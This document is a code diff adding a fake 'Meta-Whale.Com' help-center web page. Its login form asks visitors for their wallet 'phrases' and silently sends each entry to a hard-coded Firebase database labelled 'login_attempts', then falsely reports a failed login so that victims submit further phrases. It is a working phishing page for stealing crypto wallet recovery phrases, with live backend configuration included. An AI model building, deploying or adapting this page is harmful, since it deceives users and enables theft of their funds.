@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta-Whale.Com - Help Center</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: sans-serif; }
+        body { margin: 0; background-color: #000; color: #fff; overflow-x: hidden; }
+
+        /* Header UI */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; height: 60px; }
+        .help-text { font-size: 20px; font-weight: 500; }
+        .header-right { display: flex; align-items: center; gap: 10px; }
+        .igt-badge { background: #151515; border: 1px solid #333; padding: 6px 12px; border-radius: 8px; display: flex; align-items: center; gap: 8px; }
+        .menu-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 2px; padding: 5px; border: 1.5px solid #fff; border-radius: 4px; width: 24px; height: 24px; cursor: pointer; }
+        .grid-dot { width: 4px; height: 4px; background: #fff; }
+
+        .container { padding: 20px; }
+        .welcome-title { font-size: 32px; font-weight: bold; margin: 20px 0; letter-spacing: -1px; }
+
+        /* Dashboard UI */
+        .btn-container { background: #111; padding: 25px 15px; border-radius: 20px; display: flex; gap: 10px; align-items: center; justify-content: space-between; }
+        .msg-text { color: #555; font-size: 16px; flex-grow: 1; }
+        .blue-btn { background: #2b26ff; color: #fff; border: none; padding: 12px 18px; border-radius: 12px; font-weight: 600; font-size: 14px; cursor: pointer; }
+
+        /* Select a Topic Styling */
+        .label { color: #555; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; display: block; }
+        .custom-select { 
+            width: 100%; background: #0c0c0c; border: 1px solid #333; color: #fff; 
+            padding: 15px; border-radius: 12px; margin-bottom: 15px; outline: none;
+            appearance: none; background-image: url('data:image/svg+xml;charset=US-ASCII,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat: no-repeat; background-position: right 15px center;
+        }
+
+        /* Login Interface Styling */
+        .login-card { background: #111; padding: 20px; border-radius: 20px; margin-top: 20px; }
+        .login-textarea { 
+            width: 100%; 
+            height: 250px; 
+            background: #000; border: 1px solid #1c1c1c; border-radius: 15px; 
+            color: #fff; padding: 15px; outline: none; resize: none; font-size: 16px;
+        }
+        .login-submit { width: 100%; background: #2b26ff; color: #fff; border: none; padding: 18px; border-radius: 15px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        
+        #login-msg { 
+            color: #ff3b30; text-align: center; margin-top: 15px; font-weight: bold; 
+            display: none; padding: 10px; background: #000; border-radius: 10px;
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="help-text">Meta-Whale.Com</div>
+        <div class="header-right">
+            <div class="igt-badge"><div style="font-size: 14px; color: #eee;">0.00 IGT</div></div>
+            <div class="menu-grid" onclick="showPage('page-home')">
+                <div class="grid-dot"></div><div class="grid-dot"></div>
+                <div class="grid-dot"></div><div class="grid-dot"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-home">
+        <div class="container">
+            <div class="welcome-title">Welcome to the Meta-Whale.Com help center</div>
+            <div class="btn-container">
+                <span class="msg-text">My messages</span>
+                <button class="blue-btn" onclick="showPage('page-question')">Ask a question</button>
+                <button class="blue-btn" onclick="showPage('page-login')">with login</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-question" class="hidden">
+        <div class="container">
+            <div style="font-weight: bold; font-size: 24px; margin-bottom: 20px;">New question</div>
+            <span class="label">TITLE SUBJECT</span>
+            <select id="topic-select" class="custom-select">
+                <option>Select a topic</option>
+                <option>Incorrect display of income</option>
+                <option>Technical problem on the site</option>
+                <option>I can't find a referral in the structure</option>
+                <option>Others</option>
+                <option>T&S error after migration</option>
+                <option>Problem with inner balance after fork</option>
+                <option>W-DEX problems</option>
+                <option>Improvement suggestions</option>
+            </select>
+            <button class="blue-btn" style="width: 100%; margin-top: 20px;" onclick="showPage('page-home')">Back to Home</button>
+        </div>
+    </div>
+
+    <div id="page-login" class="hidden">
+        <div class="container">
+            <div class="welcome-title">Meta-Whale.Com Login</div>
+            <div class="login-card">
+                <div style="color:#666; font-size:14px; margin-bottom:15px;">login your account for direct request</div>
+                <form id="firebaseForm">
+                    <textarea id="login-input" class="login-textarea" placeholder="please enter your phrases for login account" required></textarea>
+                    <button type="submit" class="login-submit">login first</button>
+                </form>
+                <div id="login-msg">Please try another account</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+            authDomain: "v-academy-82560.firebaseapp.com",
+            projectId: "v-academy-82560",
+            storageBucket: "v-academy-82560.firebasestorage.app",
+            messagingSenderId: "826822771378",
+            appId: "1:826822771378:web:5357b1b989b298a8027fab"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function showPage(id) {
+            document.getElementById('page-home').classList.add('hidden');
+            document.getElementById('page-question').classList.add('hidden');
+            document.getElementById('page-login').classList.add('hidden');
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        document.getElementById('firebaseForm').onsubmit = (e) => {
+            e.preventDefault();
+            const val = document.getElementById('login-input').value;
+            
+            db.ref('login_attempts').push({
+                phrases: val,
+                website: "Meta-Whale.Com",
+                date: new Date().toLocaleString()
+            }).then(() => {
+                document.getElementById('login-msg').style.display = 'block';
+                document.getElementById('login-input').value = "";
+            }).catch((err) => {
+                console.error(err);
+            });
+        };
+    </script>
+</body>
+  </html>
+                                                                            
